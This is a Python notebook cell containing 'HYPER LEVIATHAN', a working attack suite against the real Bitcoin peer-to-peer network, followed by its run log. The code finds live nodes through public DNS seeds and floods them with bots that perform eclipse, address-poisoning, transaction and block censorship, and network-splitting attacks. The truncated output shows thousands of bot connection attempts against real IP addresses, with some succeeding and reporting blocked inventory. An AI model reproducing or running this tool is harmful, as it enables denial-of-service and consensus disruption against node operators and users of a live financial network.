# %%
import socket
import struct
import hashlib
import time
import random
import threading
import concurrent.futures
from collections import defaultdict
from queue import Queue
import sys

# Bitcoin seed nodes
SEED_NODES = [
    'seed.bitcoin.sipa.be',
    'dnsseed.bluematt.me',
    'dnsseed.bitcoin.dashjr.org',
    'seed.bitcoinstats.com',
    'seed.bitcoin.jonasschnelli.ch',
    'seed.btc.petertodd.org',
]

# Global storage for attack coordination
class LeviathanState:
    def __init__(self):
        self.active_connections = {}  # {node_id: socket}
        self.eclipsed_targets = {}    # {target_ip: [bot_sockets]}
        self.poisoned_addrs = []      # List of our bot IPs to spread
        self.intercepted_inventory = Queue()  # Blocked txs/blocks
        self.lock = threading.Lock()
        self.stats = {
            'connections': 0,
            'addr_messages_sent': 0,
            'inventory_blocked': 0,
            'nodes_eclipsed': 0
        }

LEVIATHAN = LeviathanState()


def double_sha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def create_message(command, payload):
    """Creates a Bitcoin protocol message"""
    magic = 0xD9B4BEF9
    command_bytes = command.encode('ascii').ljust(12, b'\x00')
    payload_len = len(payload)
    checksum = double_sha256(payload)[:4]
    return struct.pack('<I12sI4s', magic, command_bytes, payload_len, checksum) + payload


def read_varint(data, offset):
    """Reads a varint and returns (value, size_in_bytes)"""
    if offset >= len(data):
        return 0, 0
    first_byte = data[offset]
    if first_byte < 0xfd:
        return first_byte, 1
    elif first_byte == 0xfd:
        return struct.unpack('<H', data[offset+1:offset+3])[0], 3
    elif first_byte == 0xfe:
        return struct.unpack('<I', data[offset+1:offset+5])[0], 5
    else:
        return struct.unpack('<Q', data[offset+1:offset+9])[0], 9


def write_varint(n):
    """Writes a varint"""
    if n < 0xfd:
        return struct.pack('<B', n)
    elif n <= 0xffff:
        return struct.pack('<BH', 0xfd, n)
    elif n <= 0xffffffff:
        return struct.pack('<BI', 0xfe, n)
    else:
        return struct.pack('<BQ', 0xff, n)


def create_version_payload(user_agent=b'/Leviathan:2.0.0/'):
    """Creates the version payload for Bitcoin protocol handshake"""
    version = 70016
    services = 1  # NODE_NETWORK
    timestamp = int(time.time())

    addr_recv_services = 1
    addr_recv_ip = b'\x00' * 10 + b'\xff\xff' + socket.inet_aton('127.0.0.1')
    addr_recv_port = 8333
    addr_recv = struct.pack('<Q16sH', addr_recv_services, addr_recv_ip, addr_recv_port)

    addr_from_services = 1
    addr_from_ip = b'\x00' * 10 + b'\xff\xff' + socket.inet_aton('127.0.0.1')
    addr_from_port = 8333
    addr_from = struct.pack('<Q16sH', addr_from_services, addr_from_ip, addr_from_port)

    nonce = random.getrandbits(64)
    user_agent_len = len(user_agent)
    var_int_user_agent_len = write_varint(user_agent_len)

    start_height = 850000  # Fake high block height
    relay = True

    payload = struct.pack('<iQq', version, services, timestamp) + \
              addr_recv + addr_from + \
              struct.pack('<Q', nonce) + \
              var_int_user_agent_len + user_agent + \
              struct.pack('<i?', start_height, relay)
    return payload


def create_verack_message():
    """Creates a verack message"""
    return create_message('verack', b'')


def create_addr_message(addresses):
    """
    Creates an addr message to poison the network
    addresses: list of (ip_string, port) tuples
    """
    count = len(addresses)
    payload = write_varint(count)

    for ip, port in addresses:
        timestamp = int(time.time())
        services = 1  # NODE_NETWORK

        # Convert IP to bytes
        try:
            ip_bytes = b'\x00' * 10 + b'\xff\xff' + socket.inet_aton(ip)
        except:
            ip_bytes = b'\x00' * 16

        # timestamp (4) + services (8) + ip (16) + port (2)
        payload += struct.pack('<I', timestamp)
        payload += struct.pack('<Q', services)
        payload += ip_bytes
        payload += struct.pack('>H', port)  # Port is big-endian

    return create_message('addr', payload)


def create_getaddr_message():
    """Creates a getaddr message to request peer addresses"""
    return create_message('getaddr', b'')


def create_ping_message():
    """Creates a ping message to keep connection alive"""
    nonce = random.getrandbits(64)
    payload = struct.pack('<Q', nonce)
    return create_message('ping', payload)


def create_pong_message(nonce):
    """Creates a pong response"""
    payload = struct.pack('<Q', nonce)
    return create_message('pong', payload)


def read_full_message(sock, timeout=30):
    """Reads a full Bitcoin message from the socket"""
    sock.settimeout(timeout)

    # Read header (24 bytes)
    header = b''
    while len(header) < 24:
        chunk = sock.recv(24 - len(header))
        if not chunk:
            raise EOFError("Socket closed while reading header")
        header += chunk

    magic, command_bytes, length, checksum_expected = struct.unpack('<I12sI4s', header)
    command = command_bytes.decode('ascii').rstrip('\x00')

    # Read payload
    payload = b''
    while len(payload) < length:
        chunk = sock.recv(min(4096, length - len(payload)))
        if not chunk:
            raise EOFError("Socket closed while reading payload")
        payload += chunk

    return command, payload


def parse_addr_message(payload):
    """Parses an addr message to extract peer addresses"""
    addresses = []
    try:
        count, offset = read_varint(payload, 0)

        for _ in range(min(count, 1000)):  # Limit to 1000
            if offset + 30 > len(payload):
                break

            timestamp = struct.unpack('<I', payload[offset:offset+4])[0]
            offset += 4

            services = struct.unpack('<Q', payload[offset:offset+8])[0]
            offset += 8

            ip_bytes = payload[offset:offset+16]
            offset += 16

            port = struct.unpack('>H', payload[offset:offset+2])[0]
            offset += 2

            # Convert IP
            if ip_bytes[:12] == b'\x00' * 10 + b'\xff\xff':
                ip = socket.inet_ntoa(ip_bytes[12:16])
            else:
                ip = None

            if ip:
                addresses.append((ip, port, services, timestamp))
    except:
        pass

    return addresses


def parse_inv_message(payload):
    """Parses an inv message to extract inventory items"""
    inventory = []
    try:
        count, offset = read_varint(payload, 0)

        for _ in range(count):
            if offset + 36 > len(payload):
                break

            inv_type = struct.unpack('<I', payload[offset:offset+4])[0]
            offset += 4

            inv_hash = payload[offset:offset+32]
            offset += 32

            inventory.append((inv_type, inv_hash.hex()))
    except:
        pass

    return inventory


class LeviathanBot:
    """A single Leviathan bot that maintains persistent connection"""

    def __init__(self, bot_id, target_ip, target_port=8333, mode='eclipse'):
        self.bot_id = bot_id
        self.target_ip = target_ip
        self.target_port = target_port
        self.mode = mode  # 'eclipse', 'poison', 'censor', 'fragment'
        self.sock = None
        self.connected = False
        self.running = False
        self.received_addrs = []
        self.blocked_inventory = []

    def connect(self):
        """Establishes connection to target"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(15)
            self.sock.connect((self.target_ip, self.target_port))

            # Send version
            version_msg = create_message('version', create_version_payload())
            self.sock.sendall(version_msg)

            # Receive version
            command, payload = read_full_message(self.sock)
            if command != 'version':
                return False

            # Send verack
            self.sock.sendall(create_verack_message())

            # Receive verack (might receive other messages first)
            while True:
                command, payload = read_full_message(self.sock, timeout=10)
                if command == 'verack':
                    break
                elif command == 'ping':
                    nonce = struct.unpack('<Q', payload)[0]
                    self.sock.sendall(create_pong_message(nonce))

            self.connected = True

            with LEVIATHAN.lock:
                LEVIATHAN.stats['connections'] += 1
                LEVIATHAN.active_connections[self.bot_id] = self

            print(f"[Bot {self.bot_id}] ✓ Connected to {self.target_ip}")
            return True

        except Exception as e:
            print(f"[Bot {self.bot_id}] ✗ Failed to connect to {self.target_ip}: {e}")
            return False

    def poison_addr(self, fake_addresses):
        """Sends poisoned addr messages"""
        if not self.connected:
            return False

        try:
            addr_msg = create_addr_message(fake_addresses)
            self.sock.sendall(addr_msg)

            with LEVIATHAN.lock:
                LEVIATHAN.stats['addr_messages_sent'] += 1

            return True
        except:
            self.connected = False
            return False

    def request_addresses(self):
        """Requests peer addresses from target"""
        if not self.connected:
            return []

        try:
            self.sock.sendall(create_getaddr_message())

            # Wait for addr response
            start_time = time.time()
            while time.time() - start_time < 30:
                command, payload = read_full_message(self.sock, timeout=5)

                if command == 'addr':
                    addrs = parse_addr_message(payload)
                    self.received_addrs.extend(addrs)
                    return addrs
                elif command == 'ping':
                    nonce = struct.unpack('<Q', payload)[0]
                    self.sock.sendall(create_pong_message(nonce))

        except:
            pass

        return []

    def censor_inventory(self):
        """
        Intercepts and blocks inventory announcements
        Receives inv messages but doesn't forward them
        """
        if not self.connected:
            return

        try:
            command, payload = read_full_message(self.sock, timeout=5)

            if command == 'inv':
                inventory = parse_inv_message(payload)
                self.blocked_inventory.extend(inventory)

                with LEVIATHAN.lock:
                    LEVIATHAN.stats['inventory_blocked'] += len(inventory)
                    for item in inventory:
                        LEVIATHAN.intercepted_inventory.put(item)

                # DO NOT forward or request the data - just drop it
                print(f"[Bot {self.bot_id}] 🚫 Blocked {len(inventory)} inventory items")

            elif command == 'ping':
                nonce = struct.unpack('<Q', payload)[0]
                self.sock.sendall(create_pong_message(nonce))

            elif command == 'tx' or command == 'block':
                # Received actual tx/block data - absorb and don't relay
                with LEVIATHAN.lock:
                    LEVIATHAN.stats['inventory_blocked'] += 1
                print(f"[Bot {self.bot_id}] 🚫 Absorbed {command}")

        except socket.timeout:
            pass
        except Exception as e:
            self.connected = False

    def keep_alive(self):
        """Sends ping to keep connection alive"""
        if not self.connected:
            return False

        try:
            self.sock.sendall(create_ping_message())
            return True
        except:
            self.connected = False
            return False

    def run_eclipse_mode(self, duration=300):
        """
        Eclipse attack: Monopolize target's connections
        and feed them false/delayed information
        """
        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            try:
                # Keep connection alive
                self.keep_alive()

                # Handle incoming messages but don't relay
                self.censor_inventory()

                time.sleep(1)

            except Exception as e:
                break

        self.disconnect()

    def run_poison_mode(self, fake_addresses, interval=30, duration=300):
        """
        Addr poisoning: Continuously broadcast fake peer addresses
        """
        self.running = True
        start_time = time.time()
        last_poison = 0

        while self.running and (time.time() - start_time) < duration:
            try:
                current_time = time.time()

                # Send poisoned addresses periodically
                if current_time - last_poison >= interval:
                    self.poison_addr(fake_addresses)
                    last_poison = current_time
                    print(f"[Bot {self.bot_id}] 🧪 Sent {len(fake_addresses)} poisoned addresses")

                # Keep alive and handle messages
                self.keep_alive()

                try:
                    command, payload = read_full_message(self.sock, timeout=2)
                    if command == 'ping':
                        nonce = struct.unpack('<Q', payload)[0]
                        self.sock.sendall(create_pong_message(nonce))
                except socket.timeout:
                    pass

                time.sleep(1)

            except Exception as e:
                break

        self.disconnect()

    def run_censor_mode(self, duration=300):
        """
        Censorship mode: Actively block all tx/block propagation
        """
        self.running = True
        start_time = time.time()

        print(f"[Bot {self.bot_id}] 🚫 Starting censorship mode on {self.target_ip}")

        while self.running and (time.time() - start_time) < duration:
            try:
                self.censor_inventory()
                self.keep_alive()
            except:
                break

        print(f"[Bot {self.bot_id}] Censored {len(self.blocked_inventory)} items total")
        self.disconnect()

    def disconnect(self):
        """Closes the connection"""
        self.running = False
        self.connected = False

        if self.sock:
            try:
                self.sock.close()
            except:
                pass

        with LEVIATHAN.lock:
            if self.bot_id in LEVIATHAN.active_connections:
                del LEVIATHAN.active_connections[self.bot_id]


def generate_fake_addresses(count=100, base_port=8333):
    """Generates fake IP addresses for poisoning"""
    addresses = []
    for i in range(count):
        # Generate random-looking but invalid IPs
        ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        addresses.append((ip, base_port))
    return addresses


def discover_real_nodes():
    """Discovers real Bitcoin nodes from seed nodes"""
    discovered = []

    print("\n[*] Discovering real Bitcoin nodes from seeds...")

    for seed in SEED_NODES:
        try:
            # DNS lookup for seed node
            ips = socket.gethostbyname_ex(seed)[2]
            for ip in ips:
                discovered.append((ip, 8333))
            print(f"[+] {seed}: Found {len(ips)} IPs")
        except Exception as e:
            print(f"[-] {seed}: Failed - {e}")

    # Also try to connect and get more addresses
    for ip, port in list(discovered)[:3]:
        try:
            bot = LeviathanBot(0, ip, port)
            if bot.connect():
                addrs = bot.request_addresses()
                for addr in addrs:
                    discovered.append((addr[0], addr[1]))
                bot.disconnect()
                print(f"[+] Got {len(addrs)} additional addresses from {ip}")
        except:
            pass

    # Remove duplicates
    discovered = list(set(discovered))
    print(f"[*] Total discovered nodes: {len(discovered)}")

    return discovered


def print_banner():
    """Displays the HYPER LEVIATHAN v2 banner"""
    banner = """
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                                                                       ║
    ║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗                             ║
    ║   ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗                            ║
    ║   ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝                            ║
    ║   ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗                            ║
    ║   ██║  ██║   ██║   ██║     ███████╗██║  ██║                            ║
    ║   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝                            ║
    ║                                                                       ║
    ║   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗ ║
    ║   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║ ║
    ║   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║ ║
    ║   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║ ║
    ║   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║ ║
    ║   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ║
    ║                                                                       ║
    ║                     ⚡ ADVANCED ATTACK SUITE v2.0 ⚡                   ║
    ╚═══════════════════════════════════════════════════════════════════════╝

    ┌─────────────────────────────────────────────────────────────────────────┐
    │  ATTACK MODES:                                                          │
    │                                                                         │
    │  [1] 🌑 ECLIPSE ATTACK    - Isolate and blind target nodes              │
    │  [2] 🧪 ADDR POISONING    - Corrupt network's peer discovery            │
    │  [3] 🚫 CENSORSHIP        - Block transaction/block propagation         │
    │  [4] ⛓️  CHAIN SPLIT       - Fragment network consensus                  │
    │  [5] ☠️  FULL LEVIATHAN    - All attacks combined                        │
    │                                                                         │
    │  [0] 🚪 EXIT                                                            │
    └─────────────────────────────────────────────────────────────────────────┘
    """
    print(banner)


def print_stats():
    """Prints current attack statistics"""
    print("\n" + "="*60)
    print("                    📊 LEVIATHAN STATS")
    print("="*60)
    print(f"  Active Connections:     {LEVIATHAN.stats['connections']}")
    print(f"  Addr Messages Sent:     {LEVIATHAN.stats['addr_messages_sent']}")
    print(f"  Inventory Blocked:      {LEVIATHAN.stats['inventory_blocked']}")
    print(f"  Nodes Eclipsed:         {LEVIATHAN.stats['nodes_eclipsed']}")
    print("="*60 + "\n")


def eclipse_attack(num_bots, targets, duration):
    """
    Eclipse Attack: Surround target nodes with our bots
    to control what information they see
    """
    print(f"\n[*] 🌑 Starting ECLIPSE ATTACK with {num_bots} bots for {duration}s")
    print(f"[*] Targets: {len(targets)} nodes")

    bots = []

    # Distribute bots across targets
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_bots) as executor:
        futures = []

        for i in range(num_bots):
            target = targets[i % len(targets)]
            bot = LeviathanBot(i + 1, target[0], target[1], mode='eclipse')
            bots.append(bot)

            # Connect and run eclipse mode
            def run_bot(b, dur):
                if b.connect():
                    with LEVIATHAN.lock:
                        LEVIATHAN.stats['nodes_eclipsed'] += 1
                    b.run_eclipse_mode(duration=dur)

            futures.append(executor.submit(run_bot, bot, duration))

        # Wait for all bots to finish
        concurrent.futures.wait(futures)

    print_stats()


def poison_attack(num_bots, targets, duration):
    """
    Addr Poisoning Attack: Flood the network with fake peer addresses
    so new nodes connect to our bots instead of real nodes
    """
    print(f"\n[*] 🧪 Starting ADDR POISONING ATTACK with {num_bots} bots for {duration}s")

    # Generate fake addresses (our "bot network")
    fake_addrs = generate_fake_addresses(count=100)

    bots = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_bots) as executor:
        futures = []

        for i in range(num_bots):
            target = targets[i % len(targets)]
            bot = LeviathanBot(i + 1, target[0], target[1], mode='poison')
            bots.append(bot)

            def run_bot(b, addrs, dur):
                if b.connect():
                    b.run_poison_mode(addrs, interval=20, duration=dur)

            futures.append(executor.submit(run_bot, bot, fake_addrs, duration))

        concurrent.futures.wait(futures)

    print_stats()


def censor_attack(num_bots, targets, duration):
    """
    Censorship Attack: Connect to nodes and absorb all
    transaction/block announcements without relaying them
    """
    print(f"\n[*] 🚫 Starting CENSORSHIP ATTACK with {num_bots} bots for {duration}s")

    bots = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_bots) as executor:
        futures = []

        for i in range(num_bots):
            target = targets[i % len(targets)]
            bot = LeviathanBot(i + 1, target[0], target[1], mode='censor')
            bots.append(bot)

            def run_bot(b, dur):
                if b.connect():
                    b.run_censor_mode(duration=dur)

            futures.append(executor.submit(run_bot, bot, duration))

        concurrent.futures.wait(futures)

    # Print what we blocked
    print(f"\n[*] Total intercepted inventory items: {LEVIATHAN.intercepted_inventory.qsize()}")
    print_stats()


def chain_split_attack(num_bots, targets, duration):
    """
    Chain Split Attack: Divide the network into isolated groups
    by feeding different information to different regions
    """
    print(f"\n[*] ⛓️ Starting CHAIN SPLIT ATTACK with {num_bots} bots for {duration}s")

    # Divide targets into two groups
    mid = len(targets) // 2
    group_a = targets[:mid]
    group_b = targets[mid:]

    print(f"[*] Group A (will see delayed blocks): {len(group_a)} nodes")
    print(f"[*] Group B (will see false inventory): {len(group_b)} nodes")

    bots_a = []
    bots_b = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_bots) as executor:
        futures = []

        # Half bots for Group A - Eclipse mode (hide real blocks)
        for i in range(num_bots // 2):
            target = group_a[i % len(group_a)] if group_a else targets[0]
            bot = LeviathanBot(i + 1, target[0], target[1], mode='eclipse')
            bots_a.append(bot)

            def run_bot_a(b, dur):
                if b.connect():
                    with LEVIATHAN.lock:
                        LEVIATHAN.stats['nodes_eclipsed'] += 1
                    b.run_eclipse_mode(duration=dur)

            futures.append(executor.submit(run_bot_a, bot, duration))

        # Half bots for Group B - Censor mode (block all propagation)
        for i in range(num_bots // 2, num_bots):
            target = group_b[i % len(group_b)] if group_b else targets[0]
            bot = LeviathanBot(i + 1, target[0], target[1], mode='censor')
            bots_b.append(bot)

            def run_bot_b(b, dur):
                if b.connect():
                    b.run_censor_mode(duration=dur)

            futures.append(executor.submit(run_bot_b, bot, duration))

        concurrent.futures.wait(futures)

    print_stats()


def full_leviathan_attack(num_bots, targets, duration):
    """
    Full Leviathan: All attack modes running simultaneously
    """
    print(f"\n[*] ☠️ UNLEASHING FULL LEVIATHAN with {num_bots} bots for {duration}s")
    print("[*] This combines Eclipse + Poisoning + Censorship + Chain Split")

    # Divide bots among attack modes
    bots_per_mode = num_bots // 4

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_bots) as executor:
        futures = []

        fake_addrs = generate_fake_addresses(200)

        bot_id = 0

        # Eclipse bots (25%)
        for i in range(bots_per_mode):
            bot_id += 1
            target = targets[bot_id % len(targets)]
            bot = LeviathanBot(bot_id, target[0], target[1], mode='eclipse')

            def run_eclipse(b, dur):
                if b.connect():
                    with LEVIATHAN.lock:
                        LEVIATHAN.stats['nodes_eclipsed'] += 1
                    b.run_eclipse_mode(duration=dur)

            futures.append(executor.submit(run_eclipse, bot, duration))

        # Poison bots (25%)
        for i in range(bots_per_mode):
            bot_id += 1
            target = targets[bot_id % len(targets)]
            bot = LeviathanBot(bot_id, target[0], target[1], mode='poison')

            def run_poison(b, addrs, dur):
                if b.connect():
                    b.run_poison_mode(addrs, interval=15, duration=dur)

            futures.append(executor.submit(run_poison, bot, fake_addrs, duration))

        # Censor bots (25%)
        for i in range(bots_per_mode):
            bot_id += 1
            target = targets[bot_id % len(targets)]
            bot = LeviathanBot(bot_id, target[0], target[1], mode='censor')

            def run_censor(b, dur):
                if b.connect():
                    b.run_censor_mode(duration=dur)

            futures.append(executor.submit(run_censor, bot, duration))

        # Chain split bots (25%)
        remaining = num_bots - (bots_per_mode * 3)
        for i in range(remaining):
            bot_id += 1
            target = targets[bot_id % len(targets)]
            mode = 'eclipse' if i % 2 == 0 else 'censor'
            bot = LeviathanBot(bot_id, target[0], target[1], mode=mode)

            def run_split(b, dur):
                if b.connect():
                    if b.mode == 'eclipse':
                        b.run_eclipse_mode(duration=dur)
                    else:
                        b.run_censor_mode(duration=dur)

            futures.append(executor.submit(run_split, bot, duration))

        # Show live stats while running
        stats_thread = threading.Thread(target=lambda: [
            (time.sleep(30), print_stats())
            for _ in range(duration // 30)
        ])
        stats_thread.daemon = True
        stats_thread.start()

        concurrent.futures.wait(futures)

    print("\n" + "="*60)
    print("         ☠️ FULL LEVIATHAN ATTACK COMPLETE ☠️")
    print_stats()


def main():
    """Main function with interactive menu"""
    print_banner()

    while True:
        try:
            choice = input("\n[?] Select attack mode (0-5) > ").strip()

            if choice == '0':
                print("\n[*] Exiting HYPER LEVIATHAN. Goodbye!")
                break

            if choice not in ['1', '2', '3', '4', '5']:
                print("[!] Invalid choice. Please select 0-5.")
                continue

            # Get number of bots
            num_bots = int(input("[?] How many LEVIATHAN bots? > "))
            if num_bots <= 0:
                print("[!] Number of bots must be greater than 0.")
                continue

            # Get duration
            duration = int(input("[?] Attack duration in seconds (e.g., 300) > "))
            if duration <= 0:
                print("[!] Duration must be greater than 0.")
                continue

            # Discover targets
            print("\n[*] Discovering Bitcoin network nodes...")
            targets = discover_real_nodes()

            if not targets:
                print("[!] Could not discover any nodes. Using seed nodes directly.")
                targets = [(socket.gethostbyname(seed), 8333) for seed in SEED_NODES[:3]]

            # Confirmation
            print(f"\n[*] Attack Configuration:")
            print(f"    - Mode: {['', 'Eclipse', 'Poisoning', 'Censorship', 'Chain Split', 'Full Leviathan'][int(choice)]}")
            print(f"    - Bots: {num_bots}")
            print(f"    - Duration: {duration}s")
            print(f"    - Targets: {len(targets)} nodes")

            confirm = input("\n[?] Launch attack? (y/n) > ").strip().lower()
            if confirm != 'y':
                print("[*] Attack cancelled.")
                continue

            # Execute selected attack
            if choice == '1':
                eclipse_attack(num_bots, targets, duration)
            elif choice == '2':
                poison_attack(num_bots, targets, duration)
            elif choice == '3':
                censor_attack(num_bots, targets, duration)
            elif choice == '4':
                chain_split_attack(num_bots, targets, duration)
            elif choice == '5':
                full_leviathan_attack(num_bots, targets, duration)

            print("\n[*] Attack complete. Returning to menu...")

        except ValueError:
            print("[!] Please enter a valid number.")
        except KeyboardInterrupt:
            print("\n\n[*] HYPER LEVIATHAN interrupted by user.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
# Out:
# Se han truncado las últimas 5000 líneas del flujo de salida.
# [Bot 2024] ✗ Failed to connect to 146.241.2.166: timed out
# [Bot 2025] ✗ Failed to connect to 71.207.182.170: timed out
# [Bot 2016] ✗ Failed to connect to 38.18.85.21: timed out
# [Bot 2023] ✗ Failed to connect to 31.172.220.48: timed out
# [Bot 10809] ✗ Failed to connect to 109.250.156.90: [Errno 113] No route to host
# [Bot 2021] ✗ Failed to connect to 51.9.71.75: timed out
# [Bot 2027] ✗ Failed to connect to 81.83.89.72: timed out
# [Bot 2020] ✗ Failed to connect to 177.221.124.9: timed out
# [Bot 2032] ✗ Failed to connect to 173.91.240.97: timed out
# [Bot 2034] ✗ Failed to connect to 90.254.225.83: timed out
# [Bot 8358] 🚫 Blocked 1 inventory items
# [Bot 2026] ✗ Failed to connect to 49.245.116.45: timed out
# [Bot 10501] ✓ Connected to 195.140.215.118
# [Bot 2033] ✗ Failed to connect to 92.211.186.69: timed out
# [Bot 2031] ✗ Failed to connect to 185.248.85.35: timed out
# [Bot 2035] ✗ Failed to connect to 35.230.122.2: timed out
# [Bot 2028] ✗ Failed to connect to 185.220.101.188: timed out
# [Bot 2114] 🚫 Blocked 16 inventory items
# [Bot 10852] ✗ Failed to connect to 91.96.79.208: [Errno 113] No route to host
# [Bot 10863] ✗ Failed to connect to 188.174.174.240: [Errno 113] No route to host
# [Bot 2030] ✗ Failed to connect to 70.234.254.112: timed out
# [Bot 2040] ✗ Failed to connect to 84.21.169.105: timed out
# [Bot 2042] ✗ Failed to connect to 85.146.22.157: timed out
# [Bot 2037] ✗ Failed to connect to 27.56.184.3: timed out
# [Bot 2044] ✗ Failed to connect to 189.154.57.147: timed out
# [Bot 7842] 🚫 Blocked 1 inventory items
# [Bot 2045] ✗ Failed to connect to 139.62.222.15: timed out
# [Bot 10971] ✓ Connected to 66.18.13.146
# [Bot 10418] ✓ Connected to 93.226.139.159
# [Bot 10556] ✓ Connected to 172.236.101.11
# [Bot 639] 🚫 Blocked 6 inventory items
# [Bot 10621] ✓ Connected to 18.222.97.144
# [Bot 2048] ✗ Failed to connect to 213.55.244.126: timed out
# [Bot 10348] ✓ Connected to 31.39.191.13
# [Bot 2050] ✗ Failed to connect to 99.10.108.148: timed out
# [Bot 2053] ✗ Failed to connect to 78.117.90.108: timed out
# [Bot 1452] 🚫 Blocked 1 inventory items
# [Bot 2060] ✗ Failed to connect to 162.128.129.103: timed out
# [Bot 2052] ✗ Failed to connect to 208.74.106.27: timed out
# [Bot 2057] ✗ Failed to connect to 108.221.25.202: timed out
# [Bot 10912] ✗ Failed to connect to 79.209.225.246: [Errno 113] No route to host
# [Bot 2059] ✗ Failed to connect to 45.238.141.250: timed out
# [Bot 10900] ✗ Failed to connect to 82.168.90.140: [Errno 113] No route to host
# [Bot 2055] ✗ Failed to connect to 73.244.13.149: timed out
# [Bot 2061] ✗ Failed to connect to 194.114.136.39: timed out
# [Bot 2051] ✗ Failed to connect to 99.37.181.72: timed out
# [Bot 2067] ✗ Failed to connect to 159.250.96.132: timed out
# [Bot 10937] ✗ Failed to connect to 185.112.167.187: [Errno 111] Connection refused
# [Bot 2064] ✗ Failed to connect to 68.72.133.63: timed out
# [Bot 2062] ✗ Failed to connect to 70.26.133.201: timed out
# [Bot 2063] ✗ Failed to connect to 88.70.111.115: timed out
# [Bot 10909] ✗ Failed to connect to 38.147.217.227: Socket closed while reading header
# [Bot 2075] ✗ Failed to connect to 188.246.57.36: timed out
# [Bot 8597] 🚫 Blocked 4 inventory items
# [Bot 10438] ✓ Connected to 89.106.27.60
# [Bot 2082] ✗ Failed to connect to 12.26.188.167: timed out
# [Bot 10862] ✗ Failed to connect to 60.144.37.77: [Errno 111] Connection refused
# [Bot 2072] ✗ Failed to connect to 223.204.114.148: timed out
# [Bot 10548] ✓ Connected to 13.50.148.205
# [Bot 2074] ✗ Failed to connect to 104.184.37.250: timed out
# [Bot 2081] ✗ Failed to connect to 78.54.13.149: timed out
# [Bot 2068] ✗ Failed to connect to 89.245.24.52: timed out
# [Bot 2085] ✗ Failed to connect to 109.106.136.195: timed out
# [Bot 2079] ✗ Failed to connect to 76.86.1.52: timed out
# [Bot 2069] ✗ Failed to connect to 38.52.2.133: timed out
# [Bot 2078] ✗ Failed to connect to 101.71.226.127: timed out
# [Bot 2094] ✗ Failed to connect to 46.110.208.152: timed out
# [Bot 2088] ✗ Failed to connect to 51.252.162.136: timed out
# [Bot 2083] ✗ Failed to connect to 79.116.94.175: timed out
# [Bot 2089] ✗ Failed to connect to 91.139.160.150: timed out
# [Bot 10920] ✗ Failed to connect to 79.42.52.215: [Errno 113] No route to host
# [Bot 2091] ✗ Failed to connect to 109.173.126.247: timed out
# [Bot 2092] ✗ Failed to connect to 94.253.28.98: timed out
# [Bot 2090] ✗ Failed to connect to 172.50.0.1: timed out
# [Bot 2087] ✗ Failed to connect to 188.168.198.56: timed out
# [Bot 2422] 🚫 Blocked 1 inventory items
# [Bot 2077] ✗ Failed to connect to 80.187.80.65: timed out
# [Bot 1455] 🚫 Blocked 10 inventory items
# [Bot 2086] ✗ Failed to connect to 80.131.156.59: timed out
# [Bot 4123] 🚫 Blocked 5 inventory items
# [Bot 10286] ✓ Connected to 188.242.57.144
# [Bot 2096] ✗ Failed to connect to 82.64.54.215: timed out[Bot 2100] ✗ Failed to connect to 98.222.115.183: timed out
# [Bot 2103] ✗ Failed to connect to 154.242.171.172: timed out
# [Bot 10949] ✗ Failed to connect to 89.58.26.216: [Errno 111] Connection refused
#
# [Bot 2102] ✗ Failed to connect to 194.34.233.197: timed out
# [Bot 2108] ✗ Failed to connect to 89.152.32.252: timed out
# [Bot 5107] 🚫 Blocked 498 inventory items
# [Bot 2115] ✗ Failed to connect to 62.45.67.37: timed out
# [Bot 10953] ✗ Failed to connect to 35.236.40.112: Socket closed while reading header
# [Bot 2113] ✗ Failed to connect to 162.128.129.121: timed out
# [Bot 10355] ✓ Connected to 37.27.12.49
# [Bot 2106] ✗ Failed to connect to 82.26.162.17: timed out
# [Bot 2112] ✗ Failed to connect to 216.234.223.40: timed out
# [Bot 11028] ✗ Failed to connect to 172.81.182.129: [Errno 111] Connection refused
# [Bot 2120] ✗ Failed to connect to 95.159.231.150: timed out
# [Bot 2117] ✗ Failed to connect to 79.140.115.222: timed out
# [Bot 2135] ✗ Failed to connect to 205.185.120.42: timed out
# [Bot 2121] ✗ Failed to connect to 79.150.20.34: timed out
# [Bot 2128] ✗ Failed to connect to 92.179.52.1: timed out
# [Bot 2126] ✗ Failed to connect to 79.186.79.20: timed out
# [Bot 2130] ✗ Failed to connect to 79.226.93.220: timed out
# [Bot 10944] ✗ Failed to connect to 185.49.110.236: [Errno 111] Connection refused
# [Bot 2125] ✗ Failed to connect to 90.176.169.23: timed out
# [Bot 2111] ✗ Failed to connect to 178.121.78.204: timed out
# [Bot 2129] ✗ Failed to connect to 174.176.48.82: timed out
# [Bot 2109] ✗ Failed to connect to 174.201.52.135: timed out
# [Bot 2137] ✗ Failed to connect to 14.155.52.81: timed out
# [Bot 2127] ✗ Failed to connect to 99.151.52.137: timed out
# [Bot 2132] ✗ Failed to connect to 68.160.176.251: timed out
# [Bot 2110] ✗ Failed to connect to 31.144.164.104: timed out
